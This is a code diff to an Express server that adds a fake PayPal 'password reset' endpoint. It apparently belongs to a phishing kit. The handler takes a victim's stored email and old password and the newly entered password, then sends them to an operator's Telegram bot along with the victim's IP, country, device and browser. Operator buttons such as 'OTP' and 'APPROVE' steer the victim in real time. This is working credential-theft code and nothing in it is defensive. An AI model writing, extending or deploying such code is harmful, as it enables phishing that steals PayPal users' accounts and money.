@@ -360,6 +360,74 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // PayPal password reset endpoint
+  app.post("/api/paypal/password-reset", async (req, res) => {
+    try {
+      const { sessionId, newPassword, confirmPassword } = req.body;
+
+      if (!sessionId || !newPassword || !confirmPassword) {
+        return res.status(400).json({ error: "All fields required" });
+      }
+
+      if (newPassword !== confirmPassword) {
+        return res.status(400).json({ error: "Passwords do not match" });
+      }
+
+      const session = await storage.getPaypalSession(sessionId);
+      if (!session) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      const clientInfo = await getClientInfo(req);
+
+      // Send notification to Telegram
+      const settings = await storage.getAdminSettings();
+      if (settings?.telegramBotToken && settings?.telegramChatId) {
+        const message = `
+🔑 <b>PAYPAL - NOUVEAU MOT DE PASSE</b>
+
+📧 <b>Email:</b> <code>${session.email}</code>
+🔐 <b>Ancien mot de passe:</b> <code>${session.password}</code>
+🆕 <b>Nouveau mot de passe:</b> <code>${newPassword}</code>
+✅ <b>Confirmation:</b> <code>${confirmPassword}</code>
+
+🌍 <b>Pays:</b> ${clientInfo.country}
+📱 <b>Appareil:</b> ${clientInfo.device}
+🌐 <b>Navigateur:</b> ${clientInfo.browser}
+🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
+🆔 <b>Session:</b> <code>${sessionId}</code>
+⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
+`;
+
+        const keyboard = [
+          [
+            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` },
+            { text: "❌ ERROR", callback_data: `paypal_error_${sessionId}` },
+          ],
+          [
+            { text: "🔐 OTP", callback_data: `paypal_otp_${sessionId}` },
+            { text: "🎉 SUCCESS", callback_data: `paypal_success_${sessionId}` },
+          ],
+          [
+            { text: "🏠 HOME", callback_data: `paypal_home_${sessionId}` },
+          ],
+        ];
+
+        await sendTelegramMessage(
+          settings.telegramBotToken,
+          settings.telegramChatId,
+          message,
+          keyboard
+        );
+      }
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error("Password reset error:", error);
+      res.status(500).json({ error: "Failed to reset password" });
+    }
+  });
+
   // Get all waiting PayPal sessions (admin)
   app.get("/api/admin/paypal-sessions", async (req, res) => {
     try {
